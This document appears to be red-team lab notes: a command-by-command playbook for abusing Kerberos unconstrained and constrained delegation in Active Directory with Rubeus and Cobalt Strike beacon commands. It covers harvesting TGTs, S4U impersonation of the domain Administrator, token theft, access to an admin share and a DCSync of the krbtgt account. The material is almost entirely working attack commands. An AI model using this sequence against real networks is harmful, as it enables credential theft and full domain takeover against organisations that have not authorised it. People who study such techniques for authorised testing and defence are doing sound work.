
##### Unconstrained Delegation
Search for computers configured for Unconstrained Delegation
```powershell
ldapsearch (&(samAccountType=805306369 (userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
```

Within SYSTEM level beacon on Unconstrained Delegation host, monitor for incoming TGTs on host
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap
```

Stop Rubeus
```powershell
jobs
jobkill 0
```

Inject TGT into sacrificial logon session
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:dyork /password:FakePass /ticket:
```

Impersonate spawned process and confirm
```powershell
steal_token [PID]
run klist

rev2self       <--- Drop impersonation
kill [PID]
```

##### Constrained Delegation
Search for computers with Constrained Delegation (`msDS-AllowedToDelegateTo` not set to null)
```powershell
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
```

Check the UAC value to see if protocol transitioning is possible 
```powershell
ldapsearch (&(samAccountType=805306369)(samaccountname=LON-WKSTN-1$)) --attributes userAccountControl
```

We want true
```powershell
[Convert]::ToBoolean(16781312 -band 16777216)
```

Within SYSTEM level beacon on Constrained Delegation host, dump TGT for the computer account
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7  /service:krbtgt /nowrap
```

Perform the S4U abuse to obtain a usable service ticket for **a service listed in the `msDS-AllowedToDelegateTo`** value, impersonating the default domain admin.
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /msdsspn:ldap/lon-dc-1 /impersonateuser:Administrator /nowrap /ticket:
```

With Service Name Substitution **/altservice**
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /msdsspn:ldap/lon-dc-1 /impersonateuser:Administrator /nowrap /altservice:cifs,http /ticket:
```

 Inject the ticket into a sacrificial logon session.
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:
```

 Impersonate the process and verify
```powershell
steal_token [PID]
run klist

ls \\lon-fs-1\c$
dcsync CONTOSO.COM CONTOSO\krbtgt
```